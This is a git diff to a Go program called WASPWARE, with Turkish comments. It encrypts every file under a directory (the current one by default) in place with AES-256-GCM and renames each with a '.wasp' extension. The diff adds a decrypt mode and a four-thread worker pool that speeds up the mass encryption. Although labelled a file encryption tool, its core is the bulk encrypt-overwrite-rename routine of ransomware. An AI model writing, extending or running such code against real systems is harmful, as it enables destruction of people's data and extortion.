@@ -11,6 +11,8 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"strings"
+	"sync"
 )
 
 // Version - Versiyon bilgisi
@@ -106,54 +108,162 @@ func encryptAES(plainText []byte, key []byte) ([]byte, error) {
 	return encryptedData, nil
 }
 
-func makeEncrypt(path string, key []byte) error {
+func decryptAES(encryptedData []byte, key []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonceSize := gcm.NonceSize()
+	if len(encryptedData) < nonceSize {
+		return nil, fmt.Errorf("şifreli veri çok kısa")
+	}
+	nonce := encryptedData[:nonceSize]
+	data := encryptedData[nonceSize:]
+	decryptedData, err := gcm.Open(nil, nonce, data, nil)
+	if err != nil {
+		return nil, err
+	}
+	return decryptedData, nil
+}
+
+// FileProcessor - İşlemci yapılandırması
+type FileProcessor struct {
+	key         []byte
+	decryptMode bool
+	totalFiles  int
+	processed   int
+	mu          sync.Mutex
+}
+
+// processFile - Tek bir dosyayı şifrele/şifreyi çöz
+func (fp *FileProcessor) processFile(filePath string, binaryName, binaryPattern string) error {
+	content, err := os.ReadFile(filePath)
+	if err != nil {
+		return fmt.Errorf("okuma hatası: %v", err)
+	}
+
+	var processedContent []byte
+	if fp.decryptMode {
+		processedContent, err = decryptAES(content, fp.key)
+	} else {
+		processedContent, err = encryptAES(content, fp.key)
+	}
+	if err != nil {
+		return fmt.Errorf("işlem hatası: %v", err)
+	}
+
+	err = os.WriteFile(filePath, processedContent, 0644)
+	if err != nil {
+		return fmt.Errorf("yazma hatası: %v", err)
+	}
+
+	fp.mu.Lock()
+	fp.processed++
+	progress := float64(fp.processed) / float64(fp.totalFiles) * 100
+	fmt.Printf("\r  🔄 İlerleme: %.1f%% (%d/%d dosya)", progress, fp.processed, fp.totalFiles)
+	fp.mu.Unlock()
+
+	return nil
+}
+
+// makeEncrypt - Çoklu iş parçacığı ile şifrele/şifreyi çöz
+func makeEncrypt(path string, key []byte, decryptMode bool) error {
 	binaryName := filepath.Base(os.Args[0])
 	binaryPattern := binaryName + ".wasp"
 
-	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
+	// Dosyaları topla
+	var files []string
+	filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
 		}
-		if !info.IsDir() {
-			if filePath == binaryName || filePath == binaryPattern {
-				fmt.Printf("  ℹ️  Kendi dosyası atlandı: %s\n", filePath)
-				return nil
-			}
-
-			content, err := os.ReadFile(filePath)
-			if err != nil {
-				fmt.Printf("  ⚠️  Dosya okuma hatası (%s): %v\n", filePath, err)
-				return nil
-			}
-			encryptedContent, err := encryptAES(content, key)
-			if err != nil {
-				fmt.Printf("  ⚠️  Şifreleme hatası (%s): %v\n", filePath, err)
-				return nil
-			}
-			err = os.WriteFile(filePath, encryptedContent, info.Mode())
-			if err != nil {
-				fmt.Printf("  ⚠️  Dosya yazma hatası (%s): %v\n", filePath, err)
-				return err
-			}
+		if info.IsDir() {
+			return nil
 		}
+		if filePath == binaryName || filePath == binaryPattern {
+			fmt.Printf("  ℹ️  Kendi dosyası atlandı: %s\n", filePath)
+			return nil
+		}
+		// Decrypt modunda sadece .wasp dosyalarını işle
+		if decryptMode && !strings.HasSuffix(filePath, ".wasp") {
+			return nil
+		}
+		files = append(files, filePath)
 		return nil
 	})
-	return err
+
+	fp := &FileProcessor{
+		key:         key,
+		decryptMode: decryptMode,
+		totalFiles:  len(files),
+	}
+
+	if fp.totalFiles == 0 {
+		fmt.Println("\r  ℹ️  İşlenecek dosya bulunamadı")
+		return nil
+	}
+
+	// Worker pool - 4 iş parçacığı
+	const numWorkers = 4
+	jobChan := make(chan string, len(files))
+	var wg sync.WaitGroup
+
+	for i := 0; i < numWorkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for filePath := range jobChan {
+				fp.processFile(filePath, binaryName, binaryPattern)
+			}
+		}()
+	}
+
+	// İşleri dağıt
+	for _, f := range files {
+		jobChan <- f
+	}
+	close(jobChan)
+	wg.Wait()
+
+	fmt.Println("\r  ✓ Tüm dosyalar işlendi")
+
+	// Terminal açık kalacak - çıkış yapmıyoruz
+	return nil
 }
 
-func changeExtensions(path string) error {
+// changeExtensions - Şifreleme için .wasp ekle, şifreyi çözmek için kaldır
+func changeExtensions(path string, decryptMode bool) error {
 	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
 		}
-		if !info.IsDir() {
-			newPath := filePath + ".wasp"
+		if info.IsDir() {
+			return nil
+		}
+
+		var newPath string
+		if decryptMode {
+			// .wasp uzantısını kaldır
+			if strings.HasSuffix(filePath, ".wasp") {
+				newPath = strings.TrimSuffix(filePath, ".wasp")
+				fmt.Printf("  🔄 %s -> %s\n", filePath, newPath)
+			}
+		} else {
+			// .wasp uzantısını ekle
+			newPath = filePath + ".wasp"
+			fmt.Printf("  🔄 %s -> %s\n", filePath, newPath)
+		}
+
+		if newPath != "" && newPath != filePath {
 			err := os.Rename(filePath, newPath)
 			if err != nil {
 				fmt.Printf("  ⚠️  Uzantı değiştirme hatası (%s): %v\n", filePath, err)
 				return nil
 			}
-			fmt.Printf("  ✓  %s -> %s\n", filePath, newPath)
 		}
 		return nil
 	})
@@ -168,11 +278,16 @@ func repeatChar(c byte, n int) string {
 	return s
 }
 
-func runEncryption(key string, directory string) {
+func runEncryption(key string, directory string, decryptMode bool) {
+	modeText := "ŞİFRELEME"
+	if decryptMode {
+		modeText = "ŞİFRESINI ÇÖZME"
+	}
+
 	fmt.Println("\n" + repeatChar('=', 60))
-	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
+	fmt.Printf("🔐 WASPWARE - %s MODU\n", modeText)
 	fmt.Println(repeatChar('=', 60))
-	fmt.Printf("\n🔑 Şifreleme anahtarı: %s\n", key)
+	fmt.Printf("\n🔑 Anahtar: %s\n", key)
 	fmt.Println(repeatChar('-', 60))
 
 	if directory == "" {
@@ -197,39 +312,48 @@ func runEncryption(key string, directory string) {
 		keyBytes[i] = 0
 	}
 
-	fmt.Printf("\n🚀 '%s' dizinindeki dosyalar şifreleniyor...\n\n", directory)
+	fmt.Printf("\n🚀 '%s' dizinindeki dosyalar işleniyor...\n\n", directory)
 
-	err = makeEncrypt(directory, keyBytes)
+	err = makeEncrypt(directory, keyBytes, decryptMode)
 	if err != nil {
-		fmt.Printf("❌ Şifreleme sırasında hata: %v\n", err)
+		fmt.Printf("❌ İşlem sırasında hata: %v\n", err)
 		return
 	}
 
-	fmt.Println("\n🔄 Dosya uzantıları değiştiriliyor...")
-	err = changeExtensions(directory)
+	fmt.Println("\n🔄 Dosya uzantıları güncelleniyor...")
+	err = changeExtensions(directory, decryptMode)
 	if err != nil {
 		fmt.Printf("⚠️  Uzantı değiştirme sırasında bazı hatalar: %v\n", err)
 	}
 
 	fmt.Println("\n" + repeatChar('=', 60))
-	fmt.Println("✅ ŞİFRELEME TAMAMLANDI!")
+	if decryptMode {
+		fmt.Println("✅ ŞİFRESINI ÇÖZME TAMAMLANDI!")
+	} else {
+		fmt.Println("✅ ŞİFRELEME TAMAMLANDI!")
+	}
 	fmt.Println(repeatChar('=', 60))
-	fmt.Printf("\n📁 Şifrelenmiş dosyalar: %s/\n", directory)
-	fmt.Println("💾 Dosyalar AES-256-GCM ile şifrelenmiştir.")
+	fmt.Printf("\n📁 İşlenen dosyalar: %s/\n", directory)
+	if decryptMode {
+		fmt.Println("💾 Dosyalar AES-256-GCM ile şifresini çözüldü.")
+	} else {
+		fmt.Println("💾 Dosyalar AES-256-GCM ile şifrelenmiştir.")
+	}
 	fmt.Println("🔑 Anahtarı güvenli bir yerde saklayınız!")
-	fmt.Println("\n💡 Terminal açık kalıyor. Ctrl+C ile çıkış yapabilirsiniz.")
+	fmt.Println("\n💡 Terminal açık kalıyor. İşlem tamamlandı.")
 	fmt.Println(repeatChar('=', 60))
 }
 
 func main() {
-	keyPtr := flag.String("key", "", "Şifreleme anahtarı (opsiyonel)")
-	dizinPtr := flag.String("dizin", "", "Hedef dizin (opsiyonel)")
+	keyPtr := flag.String("key", "", "Anahtar")
+	dizinPtr := flag.String("dizin", "", "Hedef dizin")
+	decryptPtr := flag.Bool("decrypt", false, "Şifresini çözme modu")
 
 	flag.Parse()
 
 	if *keyPtr != "" && *dizinPtr != "" {
 		fmt.Printf("🔑 Komut satırı anahtarı kullanılıyor: %s\n", *keyPtr)
-		runEncryption(*keyPtr, *dizinPtr)
+		runEncryption(*keyPtr, *dizinPtr, *decryptPtr)
 		return
 	}
 
@@ -237,7 +361,22 @@ func main() {
 	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
 	fmt.Println(repeatChar('=', 60))
 	fmt.Println("\n📝 AES-256-GCM şifreleme kullanır.")
-	fmt.Println("📝 Tüm dosyalar .wasp uzantısına dönüştürülecektir.\n")
+	fmt.Println("📝 Çoklu iş parçacığı (4 worker) ile hızlı işlem.")
+	fmt.Println("📝 İlerleme göstergesi ile takip edilebilir.\n")
+
+	fmt.Print("🔄 İşlem modu seçiniz [1=Şifrele, 2=Şifresini Çöz]: ")
+	modeInput, _ := askForKey()
+	modeInput = trimSpace(modeInput)
+
+	var decryptMode bool
+	if modeInput == "1" {
+		decryptMode = false
+	} else if modeInput == "2" {
+		decryptMode = true
+	} else {
+		fmt.Println("❌ Geçersiz seçim. Şifreleme modu kullanılıyor.")
+		decryptMode = false
+	}
 
 	fmt.Print("🔑 Şifreleme anahtarı (boş=random): ")
 	userKey, _ := askForKey()
@@ -266,5 +405,7 @@ func main() {
 		directory = "."
 	}
 
-	runEncryption(userKey, directory)
+	runEncryption(userKey, directory, decryptMode)
+        fmt.Println("\nÇıkmak için Enter'a basın...")
+        bufio.NewReader(os.Stdin).ReadBytes('\n')
 }
